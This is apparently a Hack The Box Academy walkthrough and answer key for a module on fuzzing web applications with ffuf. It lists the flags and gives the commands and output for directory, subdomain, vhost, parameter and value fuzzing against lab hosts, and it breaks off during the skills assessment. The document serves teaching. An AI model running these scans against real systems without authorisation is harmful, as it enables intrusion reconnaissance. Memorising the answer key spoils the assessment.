![[cheatsheat-Attacking Web Applications with Ffuf]]

# Attacking Web Applications with Ffuf Module

## Section Questions Writeup

#### **Tier**: 0

#### **Difficulty**: Easy

#### **Type**: Offensive

#### **Created By**: 21y4d

#### **Co-Authors**: -

## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Directory Fuzzing|Question 1|forum|
|Page Fuzzing|Question 1|HTB{bru73_f0r_c0mm0n_p455w0rd5}|
|Recursive Fuzzing|Question 1|HTB{fuzz1n6_7h3_w3b!}|
|Sub-domain Fuzzing|Question 1|customer.inlanefreight.com|
|Filtering Results|Question 1|test.academy.htb|
|Parameter Fuzzing - GET|Question 1|user|
|Value Fuzzing|Question 1|HTB{p4r4m373r_fuzz1n6_15_k3y!}|
|Skills Assessment - Web Fuzzing|Question 1|archive, test, faculty|
|Skills Assessment - Web Fuzzing|Question 2|.php, .php7, .phps|
|Skills Assessment - Web Fuzzing|Question 3|http://faculty.academy.htb:PORT/courses/linux-security.php7|
|Skills Assessment - Web Fuzzing|Question 4|user username|
|Skills Assessment - Web Fuzzing|Question 5|HTB{w3b_fuzz1n6_m4573r}|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Directory Fuzzing

## Question 1

### "In addition to the directory we found above, there is another directory that can be found. What is it?"

After spawning the target machine, students need to use `Ffuf` on it's website's root page to fuzz for directories (the `-s` flag is for `silent` mode) (although if the keyword `FUZZ` is being used there is no need to specify it after the wordlist, it is left throughout the walkthrough's commands for clarity):

Code: shell

```shell
ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://STMIP:STMPO/FUZZ'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://206.189.26.20:30384/FUZZ'

forum
blog
```

From the output of `Ffuf`, students will know that the other directory is `forum`.

Answer: `forum`

# Page Fuzzing

## Question 1

### "Try to use what you learned in this section to fuzz the '/blog' directory and find all pages. One of them should contain a flag. What is the flag?"

Students need to fuzz for a web page/file ending with the `.php` extension inside of the `/blog/` directory:

Code: shell

```shell
ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://STMIP:STMPO/blog/FUZZ.php'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://165.22.122.134:30420/blog/FUZZ.php'

index
home
```

Visiting `http://STMIP:STMPO/blog/home.php`, students will find out the flag `HTB{bru73_f0r_c0mm0n_p455w0rd5}`:

![Attacking_Web_Applications_with_Ffuf_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/18/Attacking_Web_Applications_with_Ffuf_Walkthrough_Image_1.png)

Answer: `HTB{bru73_f0r_c0mm0n_p455w0rd5}`

# Recursive Fuzzing

## Question 1

### "Try to repeat what you learned so far to find more files/directories. One of them should give you a flag. What is the content of the flag?"

After spawning the target machine, students need to perform recursive fuzzing on its website's root page with a depth of one and append the extension of `.php` to the fuzzed files:

Code: shell

```shell
ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://STMIP:STMPO/FUZZ' -recursion -recursion-depth 1 -e '.php'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -s -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u 'http://68.183.45.211:32449/FUZZ' -recursion -recursion-depth 1 -e '.php'

<SNIP>

Starting queued job on target: http://68.183.45.211:32449/forum/FUZZ
.php
index.php
flag.php
```

The "flag.php" file inside of the `/forum/` directory holds the flag `HTB{fuzz1n6_7h3_w3b!}`:

![Attacking_Web_Applications_with_Ffuf_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/18/Attacking_Web_Applications_with_Ffuf_Walkthrough_Image_2.png)

Answer: `HTB{fuzz1n6_7h3_w3b!}`

# Sub-domain Fuzzing

## Question 1

### "Try running a sub-domain fuzzing test on 'inlanefreight.com' to find a customer sub-domain portal. What is the full domain of it?"

Students need to perform fuzzing on the domain `inlanefreight.com`, finding the sub-domain `customer.inlanefreight.com`:

Code: shell

```shell
ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u 'http://FUZZ.inlanefreight.com/'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.35]─[htb-ac-413848@htb-ty7jdwebay]─[~]
└──╼ [★]$ ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u 'http://FUZZ.inlanefreight.com/'

www
blog
support
ns3
my
customer
WWW
```

Answer: `customer.inlanefreight.com`

# Filtering Results

## Question 1

### "Try running a VHost fuzzing scan on 'academy.htb', and see what other VHosts you get. What other VHosts did you get?"

After spawning the target machine, students need to create a new VHost entry for it in `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP academy.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "159.65.27.79 academy.htb" >> /etc/hosts'
```

Then, students need to perform VHost fuzzing on the newly created entry. However, first, they need to determine the response size of a request carrying an erroneous VHost:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:STMPO/ -H 'Host: FUZZ.academy.htb'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31420/ -H 'Host: FUZZ.academy.htb'

www                     [Status: 200, Size: 986, Words: 423, Lines: 56]
mail                    [Status: 200, Size: 986, Words: 423, Lines: 56]
ftp                     [Status: 200, Size: 986, Words: 423, Lines: 56]
localhost               [Status: 200, Size: 986, Words: 423, Lines: 56]
webmail                 [Status: 200, Size: 986, Words: 423, Lines: 56]
smtp                    [Status: 200, Size: 986, Words: 423, Lines: 56]
webdisk                 [Status: 200, Size: 986, Words: 423, Lines: 56]
<SNIP>
```

The response size for any erroneous VHost is 986, thus students need to filter it out using the `-fs` flag:

Code: shell

```shell
ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:STMPO/ -H 'Host: FUZZ.academy.htb' -fs 986
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31420/ -H 'Host: FUZZ.academy.htb' -fs 986

admin
test
```

Alternatively, instead of manually fuzzing the erroneous response size, students can use the `-ac` flag to automatically calibrate filtering options:

Code: shell

```shell
ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:STMPO/ -H 'Host: FUZZ.academy.htb' -ac
```

```shell-session
┌─[htb-ac413848@htb-xihle56b8d]─[~]
└──╼ $ffuf -s -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31145/ -H 'Host: FUZZ.academy.htb' -ac

test
admin
```

Since the `admin` VHost was already mentioned in the module's section, the `test` VHost is the answer.

Answer: `test.academy.htb`

# Parameter Fuzzing - GET

## Question 1

### "Using what you learned in this section, run a parameter fuzzing scan on this page. what is the parameter accepted by this webpage?"

After spawning the target machine, students need to add the `admin.academy.htb` VHost entry in `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP admin.academy.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "139.59.180.127 admin.academy.htb" >> /etc/hosts'
```

Afterwards, students need to determine the response size of a request having an erroneous GET parameter:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://admin.academy.htb:STMPO/admin/admin.php?FUZZ=key'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://admin.academy.htb:32354/admin/admin.php?FUZZ=key'

page                    [Status: 200, Size: 798, Words: 227, Lines: 54]
message                 [Status: 200, Size: 798, Words: 227, Lines: 54]
id                      [Status: 200, Size: 798, Words: 227, Lines: 54]
c                       [Status: 200, Size: 798, Words: 227, Lines: 54]
type                    [Status: 200, Size: 798, Words: 227, Lines: 54]
debug                   [Status: 200, Size: 798, Words: 227, Lines: 54]
name                    [Status: 200, Size: 798, Words: 227, Lines: 54]
<SNIP>
```

The response size of a request having an erroneous GET parameter is 798, thus, students need to filter it out using the `-fs` flag:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://admin.academy.htb:STMPO/admin/admin.php?FUZZ=key' -fs 798
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://admin.academy.htb:32354/admin/admin.php?FUZZ=key' -fs 798

user		 [Status: 200, Size: 783, Words: 221, Lines: 54]
:: Progress: [2588/2588] :: Job [1/1] :: 219 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Therefore, the accepted/valid GET parameter is `user`.

Answer: `user`

# Value Fuzzing

## Question 1

### "Try to create the 'ids.txt' wordlist, identify the accepted value with a fuzzing scan, and then use it in a 'POST' request with 'curl' to collect the flag. What is the content of the flag?"

After spawning the target machine, students need to add the `admin.academy.htb` VHost entry in `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP admin.academy.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo sh -c 'echo "139.59.180.127 admin.academy.htb" >> /etc/hosts'
```

Then, students need to make a wordlist of numbers from 1 to 1000:

Code: bash

```bash
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ for i in $(seq 1 1000); do echo $i >> ids.txt; done
```

Subsequently, students need to perform value fuzzing on the `id` POST parameter, starting with determining the size of a request having an erroneous value for the `id` parameter:

Code: shell

```shell
ffuf -w ids.txt:FUZZ -u 'http://admin.academy.htb:STMPO/admin/admin.php' -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w ids.txt:FUZZ -u 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'

29                      [Status: 200, Size: 768, Words: 219, Lines: 54]
1                       [Status: 200, Size: 768, Words: 219, Lines: 54]
19                      [Status: 200, Size: 768, Words: 219, Lines: 54]
30                      [Status: 200, Size: 768, Words: 219, Lines: 54]
32                      [Status: 200, Size: 768, Words: 219, Lines: 54]
18                      [Status: 200, Size: 768, Words: 219, Lines: 54]
33                      [Status: 200, Size: 768, Words: 219, Lines: 54]
40                      [Status: 200, Size: 768, Words: 219, Lines: 54]
2                       [Status: 200, Size: 768, Words: 219, Lines: 54]
<SNIP>
```

The response size for any erroneous request is 768, therefore, students need to filter it out using the `-fs` flag:

Code: shell

```shell
ffuf -s -w ids.txt:FUZZ -u 'http://admin.academy.htb:STMPO/admin/admin.php' -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ffuf -w ids.txt:FUZZ -u 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768

73     		 [Status: 200, Size: 787, Words: 218, Lines: 54]
:: Progress: [1000/1000] :: Job [1/1] :: 942 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

The valid `id` value is 73, thus, students at last need to use `cURL` to invoke a POST request with the value 73 for the `id` parameter, attaining the flag `HTB{p4r4m373r_fuzz1n6_15_k3y!}`, which is contained within the first entry filtered by `grep`:

Code: shell

```shell
curl -s 'http://admin.academy.htb:STMPO/admin/admin.php' -X POST -d 'id=73' | grep 'HTB'
```

```shell-session
┌─[us-academy-1]─[10.10.14.32]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s 'http://admin.academy.htb:31865/admin/admin.php' -X POST -d 'id=73' | grep 'HTB'

<div class='center'><p>HTB{p4r4m373r_fuzz1n6_15_k3y!}</p></div>
```

Answer: `HTB{p4r4m373r_fuzz1n6_15_k3y!}`

# Skills Assessment - Web Fuzzing

## Question 1

### "Run a sub-domain/vhost fuzzing scan on '\*.academy.htb' for the IP shown above. What are all the sub-domains you can identify?"

After spawning the target machine, students first need to determine the response size of a sent request with an inexistent/erroneous VHost:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://STMIP:STMPO -H 'Host: FUZZ.academy.htb'
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-2lv8nqz9tn]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://206.189.27.155:30596 -H 'Host: FUZZ.academy.htb'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://206.189.27.155:30596
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.academy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

pop3                    [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 1ms]
mail                    [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 1ms]
localhost               [Status: 200, Size: 985, Words: 423, Lines: 55, Duration: 2ms]

<SNIP>
```

The response size for any erroneous VHost is 985, thus, students need to filter it out using the `-fs` flag:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://STMIP:STMPO -H 'Host: FUZZ.academy.htb' -fs 985
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-2lv8nqz9tn]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://206.189.27.155:30596 -H 'Host: FUZZ.academy.htb' -fs 985

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://206.189.27.155:30596
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.academy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 985
________________________________________________

test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
:: Progress: [4997/4997] :: Job [1/1] :: 595 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

Alternatively, instead of manually fuzzing the erroneous response size, students can use the `-ac` flag to automatically calibrate filtering options:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://STMIP:STMPO-H 'Host: FUZZ.academy.htb' -ac
```

```shell-session
┌─[htb-ac413848@htb-xihle56b8d]─[~]
└──╼ $ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://178.128.37.153:32342 -H 'Host: FUZZ.academy.htb' -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://178.128.37.153:32342
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.academy.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 985
 :: Filter           : Response words: 423
 :: Filter           : Response lines: 55
________________________________________________

archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3574ms]
:: Progress: [4997/4997] :: Job [1/1] :: 802 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Three VHosts exist, `test`, `archive`, and `faculty`.

Answer: `test archive faculty`

# Skills Assessment - Web Fuzzing

## Question 2

### "Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?"

From the previous question, students know that there are three VHosts, `test`, `archive`, and `faculty`, therefore, they need to run an extension fuzzing scan on all of them, one by one. However, students first need to add these entries into `/etc/hosts`:

Code: shell

```shell
sudo bash -c 'echo "STMIP test.academy.htb archive.academy.htb faculty.academy.htb" >> /etc/hosts'
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-2lv8nqz9tn]─[~]
└──╼ [★]$ sudo bash -c 'echo "206.189.27.155 test.academy.htb archive.academy.htb faculty.academy.htb" >> /etc/hosts'
```

Then, starting with the `test` VHost, students need to fuzz extensions on the `index` webpage, to know that the extensions `.php` and `.phps` are accepted:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://test.academy.htb:STMPO/indexFUZZ
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-2lv8nqz9tn]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://test.academy.htb:30596/indexFUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://test.academy.htb:30596/indexFUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.phps                   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 2ms]
:: Progress: [39/39] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Then, extension fuzzing on the `/index` webpage needs to be done for the `archive` VHost, to know that the extensions `.php` and `.phps` are accepted:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://archive.academy.htb:STMPO/indexFUZZ
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-2lv8nqz9tn]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://archive.academy.htb:30596/indexFUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://archive.academy.htb:30596/indexFUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 1ms]
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
:: Progress: [39/39] :: Job [1/1] :: 576 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

At last, extension fuzzing on the `/index` webpage needs to be done for the `faculty` VHost, to know that the extensions `.phps`, `.php`, and `.php7` are accepted:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:STMPO/indexFUZZ
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-2lv8nqz9tn]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:30596/indexFUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://faculty.academy.htb:30596/indexFUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 1ms]
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
.php7                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
:: Progress: [39/39] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Answer: `.php .phps .php7`

# Skills Assessment - Web Fuzzing

## Question 3

### "One of the pages you will identify should say 'You don't have access\!'. What is the full page URL?"

From the hint for this question, students know that they need to perform recursive fuzzing on all of the VHosts found, therefore, after fuzzing the `test` and `archive` VHosts, students will know that they do not contain the answer. Students need to perform directory fuzzing on the `faculty` VHost, setting the recursion depth to 1 and utilizing the three previously found extensions `.php`, `.phps`, and `.php7`. The response size of a request with an erroneous directory is 287, therefore, students need to filter this response size out (or alternatively, use the `-ac` option for automatically calibrating the filtering options). Additionally, students can utilize the `-mr` matcher option, which matches a regular expression, which in this case is "You don't have access!":

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:STMPO/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -fs 287 -mr "You don't have access!" -t 100
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-2lv8nqz9tn]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:30511/FUZZ -recursion -recursion-depth 1 -e .php,.php,.php7 -fs 287 -mr "You don't have access!" -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://faculty.academy.htb:30511/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .php .php7 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Regexp: You don't have access!
 :: Filter           : Response size: 287
________________________________________________

[INFO] Adding a new job to the queue: http://faculty.academy.htb:30511/courses/FUZZ
```

`Ffuf` will quickly find the `/courses/` directory, therefore, instead of waiting for the other entries to be fuzzed, students can speed up the process by canceling this `Ffuf` command and starting a new one without recursion, specifying the directory path to be `/courses/FUZZ`:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/FUZZ -e .php,.php,.php7 -fs 287 -mr "You don't have access!" -t 100
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-2lv8nqz9tn]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:30511/courses/FUZZ -e .php,.php,.php7 -fs 287 -mr "You don't have access!" -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://faculty.academy.htb:30511/courses/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .php .php7 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Regexp: You don't have access!
 :: Filter           : Response size: 287
________________________________________________

linux-security.php7     [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 3ms]
```

From the output of `Ffuf`, students will know that the page `/linux-security.php7` is the one says "You don't have access". Thus, the full path to this file becomes `http://faculty.academy.htb:PORT/courses/linux-security.php7`.

Answer: `http://faculty.academy.htb:PORT/courses/linux-security.php7`

# Skills Assessment - Web Fuzzing

## Question 4

### "In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?"

From the previous question, students know that the page is located at `/courses/linux-security.php7`, therefore, they need to utilize the same technique that was taught in the "Parameter Fuzzing - POST" section of the module. First, students need to know the response size of a request with an inexistent `POST` parameter:

Code: shell

```shell
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:STMPO/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'
```

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-y2llhq5gie]─[~]
└──╼ [★]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:32569/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://faculty.academy.htb:32569/courses/linux-security.php7
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=key
